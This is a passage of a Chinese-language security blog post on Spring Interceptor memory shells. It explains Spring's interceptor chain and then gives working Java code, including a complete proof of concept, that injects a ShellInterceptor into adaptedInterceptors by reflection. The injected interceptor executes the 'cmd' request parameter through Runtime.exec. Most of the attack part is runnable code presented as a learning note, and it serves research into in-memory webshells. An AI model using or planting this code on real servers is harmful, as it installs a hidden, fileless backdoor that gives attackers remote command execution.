+<p>继续跟进，来到一个方法：getHandlerExecutionChain</p>
+<p>该方法从 adaptedInterceptors 中把符合的拦截器添加到 chain 里，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518126.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518756.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>最后把结果返回到 doDispatch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521545.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在 doDispath  中执行 applyPreHandle 遍历执行了拦截器。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518383.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 其他师傅给出了 Filter,controller,Interceptors执行的顺序：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518441.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li>
+<li>postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li>
+<li>afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li>
+</ul>
+<h3 id="2-3-注册-Interceptor"><a href="#2-3-注册-Interceptor" class="headerlink" title="2.3 注册 Interceptor"></a>2.3 注册 Interceptor</h3><h4 id="2-3-1-获取上下文"><a href="#2-3-1-获取上下文" class="headerlink" title="2.3.1 获取上下文"></a>2.3.1 获取上下文</h4><p>参考 Controller 的获取上下文方式</p>
+<p>这里使用反射获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. 属性被 private 修饰，所以 setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. 获取一个 ApplicationContext 实例</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-3-2-获取adaptedInterceptors属性值"><a href="#2-3-2-获取adaptedInterceptors属性值" class="headerlink" title="2.3.2 获取adaptedInterceptors属性值"></a>2.3.2 获取adaptedInterceptors属性值</h4><p> 获得 <code>ApplicationContext</code> 实例后，还需要知道 <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类实例的 bean name 叫什么。  </p>
+<p> 我们可以通过<code>ApplicationContext</code>上下文来获取<code>AbstractHandlerMapping</code>，进而反射获取<code>adaptedInterceptors</code>属性值  	</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-3-3-恶意-Interceptor"><a href="#2-3-3-恶意-Interceptor" class="headerlink" title="2.3.3 恶意 Interceptor"></a>2.3.3 恶意 Interceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shell.interceptor;<br> <br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="2-3-4-动态注册Interceptor"><a href="#2-3-4-动态注册Interceptor" class="headerlink" title="2.3.4 动态注册Interceptor"></a>2.3.4 动态注册Interceptor</h4><p>我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 <code>adaptedInterceptors</code> 属性值中就可以了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将恶意Interceptor添加入adaptedInterceptors</span><br><span class="hljs-type">ShellInterceptor</span> <span class="hljs-variable">shell_interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellInterceptor</span>();<br>adaptedInterceptors.add(shell_interceptor);<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="2-3-5-完整-POC"><a href="#2-3-5-完整-POC" class="headerlink" title="2.3.5 完整 POC"></a>2.3.5 完整 POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.controller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_interceptor_controller</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/inject&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取上下文环境</span><br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br>        filed.setAccessible(<span class="hljs-literal">true</span>);<br>        org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet) filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br><br>        <span class="hljs-comment">//获取adaptedInterceptors属性值</span><br>        org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);<br><br>        <span class="hljs-comment">//将恶意 Interceptor添加入 adaptedInterceptors</span><br>        <span class="hljs-type">ShellInterceptor</span> <span class="hljs-variable">shellInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellInterceptor</span>();<br>        adaptedInterceptors.add(shellInterceptor);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518658.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518094.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521076.png" srcset="/img/loading.gif" lazyload alt="img">	</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Spring内存马 | CurlySean’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agent实现反序列化注入内存shell</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell-2/">JavaWeb 内存马二周目通关攻略 | 素十八</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/zlkq">Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/433972.html">Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Spring型内存马分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介 | 菜鸟教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Spring内存马学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11493">Spring内存马——Controller&#x2F;Interceptor构造</a></p>
+<p>[基础篇 - Javassist 使用指南](<a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> 安全&#x2F;基础篇-javassist用法指南&#x2F;)</p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1145#header-id-20">Java安全学习——ROME反序列化 - 枫のBlog</a> （使用Javassist缩短恶意class）</p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></p>
+<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agent内存马 | CurlySean’s Blog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java 内存马第三篇 - Spring 内存马</div>
+      <div>http://xvshifu.github.io/2025/11/08/Java 内存马第三篇 - Spring 内存马/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java 内存马第四篇 - Agent 内存马">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java 内存马第四篇 - Agent 内存马</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87%20-%20Tomcat%20%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java 内存马第二篇 - Tomcat 内存马">
+                        <span class="hidden-mobile">Java 内存马第二篇 - Tomcat 内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
